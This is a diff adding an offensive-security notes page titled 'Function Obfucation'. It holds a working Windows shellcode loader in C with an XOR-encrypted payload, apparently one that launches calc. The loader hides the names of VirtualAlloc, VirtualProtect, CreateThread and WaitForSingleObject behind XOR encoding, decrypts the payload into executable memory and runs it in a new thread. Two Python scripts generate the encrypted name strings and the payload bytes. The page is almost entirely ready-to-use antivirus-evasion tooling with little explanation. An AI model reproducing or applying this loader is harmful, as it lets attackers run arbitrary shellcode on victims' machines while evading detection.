@@ -1,0 +1,170 @@
+---
+description: >-
+  Some pretty basic function obfuscation using GetModuleHandle, GetProcAddress &
+  function names XOR Encryption...
+---
+
+# Function Obfucation
+
+```c
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+//python3 xor.py calc.c
+unsigned char payload[] = { 0x91, 0x31, 0xf0, 0x81, 0x93, 0x9a, 0xa5, 0x74, 0x6b, 0x65, 0x38, 0x3c, 0x38, 0x23, 0x37, 0x32, 0x24, 0x2d, 0x45, 0xb9, 0x0, 0x31, 0xe6, 0x2b, 0x13, 0x2d, 0xe8, 0x20, 0x7d, 0x3c, 0xe0, 0x37, 0x59, 0x25, 0xf2, 0x1, 0x35, 0x2b, 0x7d, 0xd2, 0x3e, 0x21, 0x28, 0x48, 0xa4, 0x31, 0x42, 0xa5, 0xcf, 0x4e, 0x4, 0x8, 0x69, 0x49, 0x59, 0x2c, 0xb8, 0xba, 0x68, 0x22, 0x73, 0xa4, 0x96, 0x86, 0x37, 0x38, 0x3c, 0x31, 0xf8, 0x37, 0x43, 0xf9, 0x27, 0x48, 0x23, 0x64, 0xa9, 0xe6, 0xf9, 0xfb, 0x65, 0x63, 0x72, 0x2d, 0xf1, 0xab, 0x11, 0x1e, 0x25, 0x78, 0xa3, 0x35, 0xe8, 0x3a, 0x7d, 0x30, 0xe0, 0x25, 0x59, 0x24, 0x78, 0xa3, 0x86, 0x35, 0x3a, 0x9a, 0xbd, 0x2a, 0xee, 0x4d, 0xe5, 0x31, 0x72, 0xb3, 0x2e, 0x43, 0xac, 0x3c, 0x5a, 0xa5, 0xd5, 0x2c, 0xb8, 0xba, 0x68, 0x22, 0x73, 0xa4, 0x4c, 0x8b, 0x10, 0x88, 0x21, 0x7a, 0x3f, 0x41, 0x6b, 0x37, 0x5c, 0xa5, 0x1e, 0xbd, 0x21, 0x29, 0xf2, 0x33, 0x41, 0x2a, 0x73, 0xb5, 0x12, 0x2a, 0xee, 0x75, 0x25, 0x3d, 0xf8, 0x25, 0x7f, 0x3b, 0x64, 0xa4, 0x2a, 0xee, 0x7d, 0xe5, 0x31, 0x72, 0xb5, 0x22, 0x2a, 0x24, 0x2c, 0x35, 0x3c, 0x23, 0x2c, 0x21, 0x32, 0x3c, 0x22, 0x28, 0x2d, 0xf7, 0x87, 0x45, 0x38, 0x3f, 0x86, 0x93, 0x3d, 0x22, 0x2b, 0x3f, 0x3c, 0xe0, 0x77, 0x90, 0x3a, 0x86, 0x8c, 0x9a, 0x3e, 0x3a, 0xdf, 0x75, 0x6b, 0x65, 0x79, 0x6d, 0x79, 0x73, 0x65, 0x2b, 0xff, 0xe8, 0x75, 0x6a, 0x65, 0x79, 0x2c, 0xc3, 0x42, 0xee, 0xc, 0xf5, 0x9a, 0xa1, 0xd0, 0x95, 0xcc, 0xcf, 0x2f, 0x32, 0xdf, 0xc5, 0xe7, 0xd8, 0xe9, 0x94, 0xb0, 0x31, 0xee, 0xbd, 0x5b, 0x59, 0x65, 0xe, 0x6f, 0xf4, 0x90, 0x85, 0xc, 0x68, 0xc2, 0x34, 0x76, 0x11, 0x1d, 0xf, 0x74, 0x32, 0x24, 0xf0, 0xb7, 0x86, 0xa6, 0x6, 0x2, 0x1e, 0x6, 0x5a, 0xe, 0x1d, 0x1c, 0x6d };
+unsigned int payload_len = sizeof(payload);
+char key[] = "mysecretkey";
+
+void XOR(char* data, size_t data_len, char* key, size_t key_len) {
+    int b=0;
+    for (int a = 0; a < data_len; a++) {
+        if (b == key_len - 1) b = 0;
+        data[a] = data[a] ^ key[b];
+        b++;
+    }
+}
+
+void XOR_KEY(char* data, size_t data_len, char* key, size_t key_len) {
+    int b = 0;
+    for (size_t a = 0; a <= data_len; a++) {
+        if (b == key_len - 1) b = 0;
+        data[a] = data[a] ^ key[b];
+        b++;
+    }
+    data[data_len] = '\x00';
+}
+
+typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
+
+typedef BOOL(WINAPI* fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+
+typedef DWORD (WINAPI* fnWaitForSingleObject)(HANDLE hHandle,DWORD  dwMilliseconds);
+
+typedef HANDLE (WINAPI* fnCreateThread)(LPSECURITY_ATTRIBUTES  lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,__drv_aliasesMem LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId);
+
+int main(void) {
+    void* exec_mem;
+    BOOL rv;
+    HANDLE th;
+    DWORD oldprotect = 0;
+    HMODULE hModule;
+    // python3 simpleXOR.py strings
+    char sVirtualAlloc[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0x16, 0xe};
+    char sVirtualProtect[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x24, 0x19, 0xa, 0xd, 0x8, 0x1a, 0x7};
+    char sCreateThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x31, 0x1c, 0x19, 0x0, 0x18, 0x9};
+    char sWaitForSingleObject[] = { 0x3a, 0x18, 0x1a, 0x11, 0x25, 0x1d, 0x17, 0x27, 0x2, 0xb, 0x1e, 0x1, 0x1c, 0x3c, 0x7, 0x9, 0x17, 0x6, 0x0};
+
+    hModule = GetModuleHandleA("Kernel32.dll");
+
+    XOR_KEY((char *)sVirtualAlloc, sizeof(sVirtualAlloc), key, sizeof(key));
+    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddress(hModule, sVirtualAlloc);
+
+    XOR_KEY((char*)sVirtualProtect, sizeof(sVirtualProtect), key, sizeof(key));
+    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)GetProcAddress(hModule, sVirtualProtect);
+
+    XOR_KEY((char*)sCreateThread, sizeof(sCreateThread), key, sizeof(key));
+    fnCreateThread pCreateThread = (fnCreateThread)GetProcAddress(hModule, sCreateThread);
+
+    XOR_KEY((char*)sWaitForSingleObject, sizeof(sWaitForSingleObject), key, sizeof(key));
+    fnWaitForSingleObject pWaitForSingleObject = (fnWaitForSingleObject)GetProcAddress(hModule, sWaitForSingleObject);
+
+    exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    XOR((char*)payload, payload_len, key, sizeof(key));
+
+    RtlMoveMemory(exec_mem, payload, payload_len);
+
+    rv = pVirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+
+    if (rv != 0) {
+        printf("Creating Thread...");
+        th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
+        pWaitForSingleObject(th, -1);
+    }
+    return 0;
+}
+```
+
+Python script to XOR encrypt names
+
+```python
+import re
+import sys
+
+KEY = "mysecretkey"
+
+
+def xor(data, key):
+    output = ""
+    for i in range(len(data)):
+        output += chr(ord(data[i]) ^ ord(key[i % len(key)]))
+    return output
+
+
+def sanitize_varname(name):
+    return re.sub(r"\W|^(?=\d)", "_", name)
+
+
+def printC(varname, ciphertext):
+    hex_bytes = [f"0x{ord(c):02x}" for c in ciphertext]
+    print(f"char s{varname}[] = {{ " + ", ".join(hex_bytes) + " };")
+
+
+if len(sys.argv) != 2:
+    print(f"File argument needed! Usage: {sys.argv[0]} <payload file>")
+    sys.exit(1)
+
+try:
+    with open(sys.argv[1], "r") as f:
+        lines = f.readlines()
+except FileNotFoundError:
+    print("File not found!")
+    sys.exit(1)
+
+for line in lines:
+    line = line.strip()
+    if not line:
+        continue
+    ciphertext = xor(line, KEY)
+    varname = sanitize_varname(line)
+    printC(varname, ciphertext)
+```
+
+Python code to XOR encrypt ShellCode
+
+```python
+import base64
+import sys
+
+KEY = "mysecretkey"
+
+def xor(data, key):
+    key = str(key)
+    l = len(key)
+    output = bytearray()
+
+    for i in range(len(data)):
+        current = data[i]  # Byte value (integer)
+        current_key = key[i % len(key)]
+        output.append(current ^ ord(current_key))  # XOR byte with key char
+
+    return output.decode("latin1")  # Return as string for printCiphertext
+
+def printCiphertext(ciphertext):
+    print(
+        "unsigned char payload[] = { 0x"
+        + ", 0x".join(hex(ord(x))[2:] for x in ciphertext)
+        + " };"
+    )
+
+try:
+    plaintext = open(sys.argv[1], "rb").read()
+except:
+    print("File argument needed! %s <raw payload file>" % sys.argv[0])
+    sys.exit()
+
+ciphertext = xor(plaintext, KEY)
+printCiphertext(ciphertext)
+```
